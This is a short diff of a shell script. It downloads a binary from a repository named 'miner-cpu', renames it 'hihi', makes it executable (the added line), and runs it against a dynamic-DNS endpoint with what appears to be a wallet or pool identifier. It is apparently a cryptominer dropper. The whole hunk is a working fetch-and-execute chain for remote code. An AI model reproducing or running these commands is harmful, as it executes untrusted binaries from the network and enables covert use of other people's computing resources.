@@ -29,5 +29,6 @@ fi
 
 wget https://github.com/StupidmanTan/miner-cpu/raw/master/aqua
 mv aqua hihi
+chmod +x hihi
 ./hihi -F http://kaquashaki.ddns.net//0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
 exit 0
